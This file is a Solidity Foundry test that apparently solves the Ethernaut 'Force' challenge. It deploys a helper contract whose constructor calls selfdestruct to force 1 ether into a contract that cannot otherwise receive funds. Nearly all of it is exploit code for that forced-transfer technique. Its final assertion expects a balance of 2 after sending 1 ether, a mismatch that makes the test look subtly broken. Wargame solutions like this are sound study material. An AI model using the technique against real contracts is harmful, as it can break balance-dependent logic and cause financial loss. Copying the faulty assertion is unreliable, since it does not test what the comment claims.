// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "../src/Force.sol";

contract ForceTest is Test{
    Force instanceAddress;

    address exploiter = mkaddr("exploiter");

    function setUp() public {
        instanceAddress = new Force();
    }

    function testForce() public {
        vm.startPrank(exploiter);
        //passing ether/wei and specify the firce contract as the recipient on deployment
        new Forcing{value: 1 ether}(payable(address((instanceAddress))));
        assertEq(address(instanceAddress).balance, 2);
        vm.stopPrank();
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }


}

contract Forcing {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}